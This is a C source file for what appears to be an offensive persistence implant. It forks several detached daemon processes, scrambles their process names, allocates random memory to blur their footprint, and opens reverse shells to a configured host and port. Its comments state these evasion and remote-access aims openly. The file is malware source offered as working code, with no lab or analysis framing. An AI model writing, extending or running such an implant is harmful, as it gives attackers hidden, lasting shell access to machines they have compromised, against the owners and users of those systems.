#define _GNU_SOURCE

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "reverse.h"
#include "util.h"

char **g_argv;
int g_argc;

void dispatch(unsigned int seed) {
    unsigned int pid = fork();
    // The parent process should return to main
    if (pid != 0) {
        return;
    }

    // Detach from this pts
    daemon(0, 0);
    scramble_process_name(seed);

    // Literally malloc some random data. Ensures memory usage looks somewhat random
    unsigned int amount = rand() % 1000000; // up to 1MB
    malloc(amount);

    // Get a reverse shell going
    reverse_shell(HOST, PORT, 1);
}

int main(int argc, char **argv) {
    unsigned int seed = time(NULL);
    int number_of_listeners = 1;
    if (argc > 1) {
        sscanf(argv[1], "%d", &number_of_listeners);
    }
    printf("Starting %d lifelines\n", number_of_listeners);

    g_argc = argc;
    g_argv = argv;

    // Close stdout and stderr, so our callee receives an EOF.
    // Especially useful when starting additional lifeline from a lifeline
    fclose(stdout);
    fclose(stderr);
    for (unsigned int i = 0; i < number_of_listeners; i++) {
        dispatch(seed ^ i);
        usleep(10000); // short sleep to mitigate race conditions when checking /proc/net/tcp
    }

    // The parent can exit, we want the rest of our program to be detached
    pthread_exit(0);
}
